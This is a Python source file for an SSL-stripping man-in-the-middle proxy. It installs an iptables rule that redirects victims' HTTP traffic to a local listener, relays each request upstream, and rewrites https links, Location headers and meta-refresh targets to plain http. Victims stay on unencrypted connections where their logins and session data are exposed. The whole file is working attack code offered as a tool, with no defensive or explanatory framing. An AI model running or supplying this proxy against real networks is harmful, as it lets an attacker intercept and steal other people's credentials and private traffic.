# ssl_strip.py
import os
import re
import socket
import threading
import select
import signal
import sys

LISTEN_BACKLOG = 100
BUFFER_SIZE = 16384

# Regex patterns to rewrite HTTPS links in the HTTP response
HTTPS_RE = re.compile(br'https://', re.IGNORECASE)
LOCATION_RE = re.compile(br'(Location:\s*)https://', re.IGNORECASE)
REFRESH_RE = re.compile(br'(content=["\']\d+;\s*url=)https://', re.IGNORECASE)

iptables_rule = None

def add_iptables_redirect(listen_port):
    global iptables_rule
    iptables_rule = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port {}".format(listen_port)
    if os.system(iptables_rule) == 0:
        print("[+] Added iptables redirect → local:{}".format(listen_port))
    else:
        print("[!] Failed to add iptables rule")

def remove_iptables_redirect():
    if iptables_rule:
        cleanup_cmd = iptables_rule.replace("-A", "-D", 1)
        os.system(cleanup_cmd)
        print("[+] iptables rule removed")

def rewrite_response(data):
    data = HTTPS_RE.sub(b"http://", data)
    data = LOCATION_RE.sub(lambda m: m.group(1) + b"http://", data)
    data = REFRESH_RE.sub(lambda m: m.group(1) + b"http://", data)
    return data

def relay(upstream, downstream):
    sockets = [upstream, downstream]
    try:
        while True:
            r, _, _ = select.select(sockets, [], [])
            for s in r:
                other = downstream if s is upstream else upstream
                chunk = s.recv(BUFFER_SIZE)
                if not chunk:
                    return
                if s is upstream:
                    chunk = rewrite_response(chunk)
                other.sendall(chunk)
    finally:
        upstream.close()
        downstream.close()

def extract_host(request):
    for line in request.split(b"\r\n"):
        if line.lower().startswith(b"host:"):
            return line.split(b":", 1)[1].strip().decode(errors="ignore")
    return None

def handle_client(client_sock, client_addr):
    try:
        request = client_sock.recv(BUFFER_SIZE)
        if not request:
            client_sock.close()
            return

        host = extract_host(request)
        if not host:
            print("[!] No Host header from {}".format(client_addr))
            client_sock.close()
            return

        # ⚠️ Corrected: connect to port 80 (HTTP), NOT 443
        upstream = socket.create_connection((host, 80), timeout=5)
        upstream.sendall(request)
        relay(upstream, client_sock)

    except Exception as e:
        print("[!] Error handling {}: {}".format(client_addr, e))
        client_sock.close()

def start_ssl_strip_proxy(listen_port, use_iptables=False):
    if use_iptables:
        add_iptables_redirect(listen_port)

    def cleanup(signum=None, frame=None):
        remove_iptables_redirect()
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", listen_port))
    server.listen(LISTEN_BACKLOG)
    print("[*] SSL Strip proxy listening on 0.0.0.0:{}".format(listen_port))

    try:
        while True:
            client, addr = server.accept()
            threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()
    except KeyboardInterrupt:
        pass
    finally:
        remove_iptables_redirect()
        server.close()
